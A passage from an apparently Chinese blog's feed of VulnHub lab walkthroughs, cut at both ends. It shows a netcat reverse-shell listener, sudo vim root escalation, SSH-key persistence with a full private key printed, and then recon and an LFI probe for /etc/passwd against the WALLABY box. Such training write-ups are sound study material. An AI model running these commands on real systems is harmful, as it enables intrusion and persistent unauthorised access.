/dev/shm/shell.sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-027.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听 4444 端口，等待定时任务被执行，shell成功反弹出来&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过下面的命令来把终端标准一点显示：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; then press Ctrl+Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg then press ENTER twice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-028.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;vim-shell提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vim-shell提权&#34;&gt;#&lt;/a&gt; vim-shell 提权&lt;/h3&gt;
&lt;p&gt;列出用户权限或检查特定命令&lt;br&gt;
 &lt;code&gt;sudo -l&lt;/code&gt; &lt;br&gt;
 这里发现有可调用 root 执行无密码的 vim 命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-029.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;提权超级丰富的网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;直接写一个 vim shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo vim -c ‘:!/bin/sh’ 表示以root权限去写vim shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-030.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;篡改authorized_keys维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改authorized_keys维权&#34;&gt;#&lt;/a&gt; 篡改 authorized_keys 维权&lt;/h3&gt;
&lt;p&gt;靶机：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;给靶机打印公钥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;ssh-rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AAAAB3NzaC1yc2EAAAADAQABAAABgQCysSKgDq+5dEpirNHGl2j+ceqNRQHnSAHgQ3zsKqmUn9iyks&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5L07z9Y34OEvUsYAxsFgdLtdD+MxufPPQwj8a77hmcqWguq5EmJUiZ7fA/peddvGR9Q5ypMpkuMFm2W2gIg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kVG+b4XPCQ0ydC9gn8ac7dReeMIykcD+vcQgpvHniK45rqAJJwbnb9MxNGDuPQHlSCSGA3FtHayNNsAmC&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+ek1m2Qk3oVUF/8XGnjHvw2fMTog8h41Se8lYgHLDf8o4IibuOxxxpNVYOIgUZ0Ahvg9+srGvzquDS/yqXDf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;06aBGHj+ISjOZ9wrB/Qmg3ArylKCaRk8UztsXg4gkCKiGiAynYY/EqNzXAuR42A1lby+kf9FUwSXGp8wdRG&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;YVc3yOWQm+lHy5Ov1RqdSCsMMYkyqAOV+2weoRki9iONN8h7YVWX9hBoVPpRiLKDfG3aLkjRVyPrpx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+qVHNo8rYHI9zjiTAhM/PJFarLhMEg+e3AvbEPBCN6p5lmO3lAdXX40= root@earth&amp;#x27; &amp;gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击机：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;给攻击机打印私钥，注意私钥里边的第一行不能有空行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NhAAAAAwEAAQAAAYEAsrEioA6vuXRKYqzRxpdo/nHqjUUB50gB4EN87CqplJ/YspLOS9O&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/WN+DhL1LGAMbBYHS7XQ/jMbnzz0MI/Gu+4ZnKloLquRJiVIme3wP6XnXbxkfUOcqTKZLj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BZtltoCIJFRvm+FzwkNMnQvYJ/GnO3UXnjCMpHA/r3EIKbx54iuOa6gCScG52/TMTRg7j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;B5UgkhgNxbR2sjTbAJgvnpNZtkJN6FVBf/Fxp4x78NnzE6IPIeNUnvJWIByw3/KOCIm7js&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ccaTVWDiIFGdAIb4PfrKxr86rg0v8qlw3/dOmgRh4/iEozmfcKwf0JoNwK8pSgmkZPFM7b&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;F4OIJAiohogMp2GPxKjc1wLkeNgNZW8vpH/RVMElxqfMHURmFXN8jlkJvpR8uTr9UanUgr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DDGJMqgDlftsHqEZIvYjjTfIe2FVl/YQaFT6UYiyg3xt2i5I0Vcj66cfqlRzaPK2ByPc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kwITPzyRWqy4TBIPntwL2xDwQjeqeZZjt5QHV1+NAAAFgL9tgH2/bYB9AAAAB3NzaC1yc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EAAAGBALKxIqAOr7l0SmKs0caXaP5x6o1FAedIAeBDfOwqqZSf2LKSzkvTvP1jfg4S9Sxg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DGwWB0u10P4zG5889DCPxrvuGZypaC6rkSYlSJnt8D+l5128ZH1DnKkymS4wWbZbaAiCRU&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b5vhc8JDTJ0L2Cfxpzt1F54wjKRwP69xCCm8eeIrjmuoAknBudv0zE0YO49AeVIJIYDcW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;drI02wCYL56TWbZCTehVQX/xcaeMe/DZ8xOiDyHjVJ7yViAcsN/yjgiJu47HHGk1Vg4iBR&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nQCG+D36ysa/Oq4NL/KpcN/3TpoEYeP4hKM5n3CsH9CaDcCvKUoJpGTxTO2xeDiCQIqIaI&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DKdhj8So3NcC5HjYDWVvL6R/0VTBJcanzB1EZhVzfI5ZCb6UfLk6/VGp1IKwwxiTKoA5X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bB6hGSL2I403yHthVZf2EGhU+lGIsoN8bdouSNFXI+unH6pUc2jytgcj3OOJMCEz88kVqs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uEwSD57cC9sQ8EI3qnmWY7eUB1dfjQAAAAMBAAEAAAGBAJ6lZ5FlGJx1Y6lRt/kx6hSlfN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gpp7P4GTpLkLh4dBCxDgoVDrUBqvPohjzmlees6rp3oEiWhpN5OpfY3Q/URmQJU5HkUcvF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pNuSFHAdcMSBffWZ0jnocklB0//PC4c8hhOv3OPTzPICAj8fwoTOPBx3ChV7OpdOR1iAUy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PEYZwLiNZSethUKIjYN8RnpX/mEDo/Kyip1Ghn/U3gYWOYugZ22hpXqaWRM9LswLQ5pLxE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NGyE4Bx9IV7w1ogyENLzG60Eycb80YF7UX1a3wwT1MmhdXTHe23mPZ0NAS0vXgX/Z5za7Y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mZhSvWyEY9OSuscnQMARLD07y8lmCiMvdpy/u7mEM9xq+qy/1RpAi+b1xFifZPjvTSKPpz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+UXrQXhInPY20mUX6UtJtzK6uH4wbfhewSaBG/QKCTJwmqWWuGOO/juBfdrESvBkrRXRrX&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;XjKnGo1/3KCYegY6lnLZdYIFGLchDQSsoAcRojLSarMDR/GS2p4UJqU2eGLlGDG+4PfQAA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AMASNt36l5t/f9gR/6qD+WVARaYc8EvlczrR6TiWNGd0UUti31Px9PKFETku/hWcHLjlRS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BJxxMm0uMbBgh+oiOHlIcJz5PRuKHzC48kn/n8YcPs7C00UiR4JuQzxMQuJPXYntaks/YU&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nH30fGkrBY14Db4MEF2WEIYCGbbD6FROxVoA39oXAeMRtC9VTbhgc5WiGjW8kadZgAyEvn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;krfRtv9hDn1pyquiS7L8bAI+klJgulyuO8beLsNX0oMkw+RbAAAADBANxEmaC8oVnD8pRL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JfTzIIg7OI9g1gXPrT/ZlMgfxxlfQiWdQqoqmQfX4EthskAVwS3n9n7h4E5/4IOU+aLmn+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mrsx6aZhwVeF3bHLRfQmRqf6WBc58upcUrZqWPQ5hZfBzpDZFddixjhS0FU3rDlrEJJ9WL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;R2D/q769sgV4dAXerLW643w3IKJA3liRQpBLrmcUHeN0VCbVfBVfrfz3lWN8vcikX2cSj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Vhp4jiMkroUJhEMm90N0rnAG/VfXiEXwAAAMEAz63xywZopECaqv8LSXlOAbLpNyKj/TQ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1XCOW9N3/DxE7swiSQmP35aoj3D2BmaaBIfTI+Jgxaoq8GUI/tSpgVVTVxQAHTByorVWLn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yDxM27xB4+20KVa8+LUbe7t3tK40cbzo6i4+0TCyM2M0Oxq2242c8jv1A9gMuSLT3B4Wj&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fXSe1ypztVEyPr0LnB9khH9nyLe9IhChYAG6mPW31I0dnrtmy2UdMkOwscMuqKwpevijY&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PJaNWLEHEcEcOTAAAACnJvb3RAZWFydGg=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27; &amp;gt;&amp;gt; ~/.ssh/vulnhub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-031.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用ssh私钥登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 700 ~/.ssh/vulnhub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.170 -i ~/.ssh/vulnhub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 成功登陆到了对方服务器&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/109%20WALLABY/</id>
        <title>VULNHUB 9 WALLABY</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/109%20WALLABY/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2FsbGFieXMtbmlnaHRtYXJlLXYxMDIsMTc2Lw==&#34;&gt;https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1L2FydGljbGUvZGV0YWlscy8xMDQwOTUwMjk=&#34;&gt;https://blog.csdn.net/qq_34801745/article/details/104095029&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 WALLABY：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-150.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.5&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.15 -oN /tmp/wallaby.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-151.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80, 6667&lt;/p&gt;
&lt;h3 id=&#34;lfi-漏洞测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lfi-漏洞测试&#34;&gt;#&lt;/a&gt; LFI 漏洞测试&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS8=&#34;&gt;http://192.168.31.5/&lt;/span&gt; 进行信息收集&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-152.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入名字并登陆此网站&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-153.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;观察 url 地址，发现存在 lfi 本地文件包含漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-154.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;直接构造 http://192.168.31.5/?page=/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-155.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;访问 http://192.168.31.5/?page=/etc/sudoers 发现对方管理员检测到了 lfi 攻击&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-156.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;重新访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS8=&#34;&gt;http://192.168.31.5/&lt;/span&gt; 发现网站已经挂掉了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-157.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 80 端口被关闭，网站已被注销，重新尝试端口扫描&lt;/p&gt;
&lt;h3 id=&#34;60080-网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#60080-网站信息收集&#34;&gt;#&lt;/a&gt; 60080 网站信息收集&lt;/h3&gt;
&lt;p&gt;重新扫描端口，发现 80 被关闭，新开了一个 60080 端口网站&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8=&#34;&gt; http://192.168.31.5:60080/&lt;/span&gt; 渗透测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-158.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现此端口确实存在网站，目标转为对此网站的分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-159.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;目录爆破，收集更多的目录信息&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dirsearch -u http://192.168.31.5:60080/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.5:60080/ - w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-160.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并没有发现任何有价值的信息&lt;/p&gt;
